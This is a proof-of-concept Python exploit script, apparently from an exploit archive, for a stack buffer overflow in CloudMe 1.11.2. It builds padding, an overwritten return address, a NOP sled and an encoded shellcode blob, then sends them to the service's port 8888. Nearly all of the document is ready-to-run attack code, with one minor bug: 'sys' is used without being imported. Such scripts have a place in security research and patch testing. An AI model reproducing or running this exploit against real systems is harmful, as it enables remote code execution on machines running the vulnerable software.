# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

buf =  b""
buf += b"\xdb\xc2\xd9\x74\x24\xf4\x5e\x33\xc9\xb1\x52\xba\x2b"
buf += b"\xbb\xd2\x98\x31\x56\x17\x83\xee\xfc\x03\x7d\xa8\x30"
buf += b"\x6d\x7d\x26\x36\x8e\x7d\xb7\x57\x06\x98\x86\x57\x7c"
buf += b"\xe9\xb9\x67\xf6\xbf\x35\x03\x5a\x2b\xcd\x61\x73\x5c"
buf += b"\x66\xcf\xa5\x53\x77\x7c\x95\xf2\xfb\x7f\xca\xd4\xc2"
buf += b"\x4f\x1f\x15\x02\xad\xd2\x47\xdb\xb9\x41\x77\x68\xf7"
buf += b"\x59\xfc\x22\x19\xda\xe1\xf3\x18\xcb\xb4\x88\x42\xcb"
buf += b"\x37\x5c\xff\x42\x2f\x81\x3a\x1c\xc4\x71\xb0\x9f\x0c"
buf += b"\x48\x39\x33\x71\x64\xc8\x4d\xb6\x43\x33\x38\xce\xb7"
buf += b"\xce\x3b\x15\xc5\x14\xc9\x8d\x6d\xde\x69\x69\x8f\x33"
buf += b"\xef\xfa\x83\xf8\x7b\xa4\x87\xff\xa8\xdf\xbc\x74\x4f"
buf += b"\x0f\x35\xce\x74\x8b\x1d\x94\x15\x8a\xfb\x7b\x29\xcc"
buf += b"\xa3\x24\x8f\x87\x4e\x30\xa2\xca\x06\xf5\x8f\xf4\xd6"
buf += b"\x91\x98\x87\xe4\x3e\x33\x0f\x45\xb6\x9d\xc8\xaa\xed"
buf += b"\x5a\x46\x55\x0e\x9b\x4f\x92\x5a\xcb\xe7\x33\xe3\x80"
buf += b"\xf7\xbc\x36\x06\xa7\x12\xe9\xe7\x17\xd3\x59\x80\x7d"
buf += b"\xdc\x86\xb0\x7e\x36\xaf\x5b\x85\xd1\xda\x91\x8b\x22"
buf += b"\xb3\xa7\x93\x07\x6a\x21\x75\x2d\x7c\x67\x2e\xda\xe5"
buf += b"\x22\xa4\x7b\xe9\xf8\xc1\xbc\x61\x0f\x36\x72\x82\x7a"
buf += b"\x24\xe3\x62\x31\x16\xa2\x7d\xef\x3e\x28\xef\x74\xbe"
buf += b"\x27\x0c\x23\xe9\x60\xe2\x3a\x7f\x9d\x5d\x95\x9d\x5c"
buf += b"\x3b\xde\x25\xbb\xf8\xe1\xa4\x4e\x44\xc6\xb6\x96\x45"
buf += b"\x42\xe2\x46\x10\x1c\x5c\x21\xca\xee\x36\xfb\xa1\xb8"
buf += b"\xde\x7a\x8a\x7a\x98\x82\xc7\x0c\x44\x32\xbe\x48\x7b"
buf += b"\xfb\x56\x5d\x04\xe1\xc6\xa2\xdf\xa1\xf7\xe8\x7d\x83"
buf += b"\x9f\xb4\x14\x91\xfd\x46\xc3\xd6\xfb\xc4\xe1\xa6\xff"
buf += b"\xd5\x80\xa3\x44\x52\x79\xde\xd5\x37\x7d\x4d\xd5\x1d"

payload = buf

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
